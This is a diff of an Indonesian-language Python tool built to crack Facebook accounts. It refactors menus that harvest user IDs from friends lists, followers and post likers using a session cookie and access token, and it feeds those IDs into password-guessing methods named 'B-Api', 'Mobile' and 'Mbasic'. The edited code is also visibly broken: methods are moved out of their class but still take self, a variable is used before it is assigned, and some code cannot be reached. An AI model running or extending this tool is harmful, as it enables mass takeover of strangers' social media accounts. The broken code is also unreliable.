@@ -112,7 +112,7 @@ def login_cookie():
                 name, id = dapatkan_nama(cookie, token_eaag)
                 Console(width=50, style="bold hot_pink2").print(Panel(f"""[bold white]Nama :[bold green] {name}
 [bold white]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Welcome) [bold green]<[bold yellow]<[bold red]<"));bot_komen(cookie, token_eaag)
-                open('Data/Cookie.json', 'w').write(json.dumps({'Cookie': cookie}));open('Data/Token.json', 'w').write(json.dumps({'Token': token_eaag}));time.sleep(3.6);daftar_menu()
+                open('Data/Cookie.json', 'w').write(json.dumps({'Cookie': cookie}));open('Data/Token.json', 'w').write(json.dumps({'Token': token_eaag}));time.sleep(3.6);setting()
         elif query == '2' or query == '02':
             try:
                 Console().print("[bold hot_pink2]   ╰─>[bold green] Kamu Akan Diarahkan Ke Youtube!", end='\r');time.sleep(3.6);os.system("xdg-open https://www.youtube.com/watch?v=3Y6xsMB3wRg");exit()
@@ -138,71 +138,9 @@ def bot_komen(cookie, token_eaag):
             return 0
         else:
             return 1
-### DAFTAR MENU ###
-def daftar_menu():
-    banner_logo()
-    try:
-        cookie = json.loads(open('Data/Cookie.json', 'r').read())['Cookie']
-        token_eaag = json.loads(open('Data/Token.json', 'r').read())['Token']
-        name, id = dapatkan_nama(cookie, token_eaag)
-        Console(width=50, style="bold hot_pink2").print(Panel(f"""[bold white]Nama :[bold green] {name}
-[bold white]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Welcome) [bold green]<[bold yellow]<[bold red]<"))
-    except Exception as e:
-        Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));time.sleep(3.6);login_cookie()
-        Console(width=50, style="bold hot_pink2").print(Panel("""[bold green]1[bold white]. Crack User Dari Publik Or Friends
-[bold green]2[bold white]. Crack User Dari Pengikut
-[bold green]3[bold white]. Crack User Dari Like Postingan
-[bold green]4[bold white]. Keluar ([bold red]Logout[bold white])
-[bold green]5[bold white]. Ganti UA""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Crack Facebook) [bold green]<[bold yellow]<[bold red]<"))
-        query = Console().input("[bold hot_pink2]   ╰─> ")
-        if query == '1' or query == '01':
-            try:
-                Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan[italic green] ID Akun Facebook[italic white], Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 757953543,4", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
-                userid = Console().input("[bold hot_pink2]   ╰─> ")
-                for z in userid.split(','):
-                    dump().publik(int(z), cookie, unit_cursor = '')
-                    if len(Dump) < 50:
-                        Console().print("[bold hot_pink2]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit()
-                    else:
-                        Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
-            except Exception as e:
-                Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
-        elif query == '2' or query == '02':
-            try:
-                Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan[italic green] ID Akun Facebook[italic white], Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 757953543,4", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
-                userid = Console().input("[bold hot_pink2]   ╰─> ")
-                for z in userid.split(','):
-                    dump().pengikut(z, cookie, token_eaag)
-                    if len(Dump) < 50:
-                        Console().print("[bold hot_pink2]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit()
-                    else:
-                        Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
-            except Exception as e:
-                Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
-        elif query == '3' or query == '03':
-            try:
-                Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan ID Postingan, Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 10160334652393544", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
-                postid = Console().input("[bold hot_pink2]   ╰─> ")
-                for z in postid.split(','):
-                    dump().likes(z, cookie, token_eaag, after = '')
-                    if len(Dump) < 1:
-                        Console().print("[bold hot_pink2]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit()
-                    else:
-                        Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
-            except Exception as e:
-                Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
-        elif query == '4' or query == '04':
-            try:
-                os.remove('Data/Cookie.json');os.remove('Data/Token.json');Console().print("[bold hot_pink2]   ╰─>[bold green] Keluar Dari Program!", end='\r');time.sleep(3.6);exit()
-            except:exit()
-        elif query == '5' or query == '05':
-            uagent()
-        else:
-            Console().print("[bold hot_pink2]   ╰─>[bold red] Pilihan Tidak Diketahui!", end='\r');time.sleep(3.6);daftar_menu()
+        
 ### DUMP ###
-class dump:
-
-    def publik():
+def dump_publik():
         try:
             token = open('.token.txt','r').read()
         except IOError:
@@ -230,7 +168,7 @@ class dump:
             sol().print(teks2)
             exit()
     ### DUMP PENGIKUT ###
-    def pengikut(self, userid, cookie, token_eaag):
+def pengikut(self, userid, cookie, token_eaag):
         try:
             with requests.Session() as r:
                 r.headers.update({
@@ -258,7 +196,7 @@ class dump:
             Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
             return 2
     ### DUMP LIKES ###
-    def likes(self, postid, cookie, token_eaag, after):
+def likes(self, postid, cookie, token_eaag, after):
         try:
             with requests.Session() as r:
                 r.headers.update({
@@ -286,6 +224,80 @@ class dump:
             Console().print(f"[bold hot_pink2]   ╰─>[bold yellow] KeyboardInterrupt!          ", end='\r');time.sleep(3.6)
             return 2
 def setting():
+    try:
+        cookie = json.loads(open('Data/Cookie.json', 'r').read())['Cookie']
+        token_eaag = json.loads(open('Data/Token.json', 'r').read())['Token']
+        name, id = dapatkan_nama(cookie, token_eaag)
+        Console(width=50, style="bold hot_pink2").print(Panel(f"""[bold white]Nama :[bold green] {name}
+[bold white]User :[bold yellow] {id}""", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Welcome) [bold green]<[bold yellow]<[bold red]<"))
+    except Exception as e:
+        Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));time.sleep(3.6);login_cookie()
+        Console(width=50, style="bold hot_pink2").print(Panel("""[bold green]1[bold white]. Crack User Dari Publik Or Friends
+[bold green]2[bold white]. Crack User Dari Pengikut
+[bold green]3[bold white]. Crack User Dari Like Postingan
+[bold green]4[bold white]. Keluar ([bold red]Logout[bold white])
+[bold green]5[bold white]. Ganti UA""", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Crack Facebook) [bold green]<[bold yellow]<[bold red]<")) 
+        jh = input(x+'['+p+'•'+x+'] Pilih ╰─> ')
+    if jh in ['1','01']:
+        dump_publik()
+    elif jh in ['2','02']:		
+        try:
+                Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan[italic green] ID Akun Facebook[italic white], Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 757953543,4", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
+                userid = Console().input("[bold hot_pink2]   ╰─> ")
+                for z in userid.split(','):
+                    pengikut(z, cookie, token_eaag)
+                    if len(Dump) < 50:
+                        Console().print("[bold hot_pink2]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit()
+                    else:
+                        Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
+        except Exception as e:
+                Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
+ 
+    elif jh in ['3','03']:
+        try:
+                Console(width=50, style="bold hot_pink2").print(Panel("[italic white]Silahkan Masukan ID Postingan, Gunakan Koma Untuk Dump Masal, Misalnya :[italic green] 10160334652393544", subtitle="╭───", subtitle_align="left", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Catatan) [bold green]<[bold yellow]<[bold red]<"))
+                postid = Console().input("[bold hot_pink2]   ╰─> ")
+                for z in postid.split(','):
+                    likes(z, cookie, token_eaag, after = '')
+                    if len(Dump) < 1:
+                        Console().print("[bold hot_pink2]   ╰─>[bold yellow] Jumlah User Terlalu Sedikit!", end='\r');time.sleep(3.6);exit()
+                    else:
+                        Console(width=50, style="bold hot_pink2").print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Dump Sukses) [bold green]<[bold yellow]<[bold red]<"));crack().open_list()
+        except Exception as e:
+                Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
+
+    elif jh in ['4','04']:
+        grup()
+    elif jh in ['5','05']:
+        uagent()
+    elif jh in ['0','00']:
+        os.system('rm -rf .token.txt')
+        print(x+'['+h+'•'+x+'] Tunggu ...')
+        time.sleep(1)
+        sw = '# SUKSES KELUAR'
+        sol().print(mark(sw, style='green'))
+        exit()
+    else:
+        ric = '# PILIH YANG BENER LAH BANG'
+        sol().print(mark(ric, style='red'))
+        exit()
+        
+        wl = '# SETTING URUTAN ID'
+        sol().print(mark(wl, style='cyan'))
+        teks = '[01] Crack Dari Akun Tertua [mayan]\n[02] Crack Dari Akun Termuda [Mantap]'
+        tak = nel(teks, style='cyan')
+        cetak(nel(tak, title='SETTING'))
+        hu = input(x+'['+p+'f'+x+'] Pilih : ')
+        if hu in ['1','01']:
+            for bacot in id:
+                id2.append(bacot)
+        elif hu in ['2','02']:
+            for bacot in id:
+                id2.insert(0,bacot)
+        else:
+            ric = '# PILIHAN TIDAK ADA DI MENU'
+            sol().print(mark(ric, style='red'))
+            exit()
         met = '# PILIH METHOD CRACK'
         sol().print(mark(met, style='cyan'))
         ioz = '[01] Method B-Api\n[02] Method Mobile\n[03] Method Mbasic Selow Crack'
@@ -897,25 +909,25 @@ def uas(__Aang__Sayang__Laura__):
 		ua = input("[!] User agent : ")
 		if ua in(""):
 			print ('\n[!] Yang bener kontol');time.sleep(2)
-			daftar_menu()
+			menu()
 		elif ua in("CANCEL","Cancel","cancel"):
 			ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]")
 			open("ua.txt","w").write(ua_);time.sleep(2)
 			print ("\n[✓]  Berhasil menggunakan user agent script ");time.sleep(2)
-			daftar_menu()
+			menu()
 		open("ua.txt","w").write(ua);time.sleep(2)
 		print ("\n[✓] Berhasil mengganti user agent");time.sleep(2)
-		daftar_menu()
+		menu()
 	elif __Aang__Sayang__Laura__ in("2","02"):
 		try:
 			ualo = open('ua.txt', 'r').read();time.sleep(2)
 			print ("[+] User anget lu : "+ualo);time.sleep(2)
 			input('\n[!] Tekan enter ')
-			daftar_menu()
+			menu()
 		except IOError:
 			print('error')
 	elif __Aang__Sayang__Laura__ in("0","00"):
-		daftar_menu()
+		menu()
 	else:
 		print ('\n[!] Yang bener bang');time.sleep(2)
 		uas(__Aang__Sayang__Laura__)
@@ -1023,6 +1035,6 @@ def realme_useragent(self, total):
 		
 if __name__ == '__main__':
     try:
-        os.system('git pull');daftar_menu()
+        os.system('git pull');menu()
     except Exception as e:
         Console(width=50, style="bold hot_pink2").print(Panel(f"[italic red]{str(e).title()}", title="[bold red]>[bold yellow]>[bold green]>[hot_pink2] (Error) [bold green]<[bold yellow]<[bold red]<"));exit()
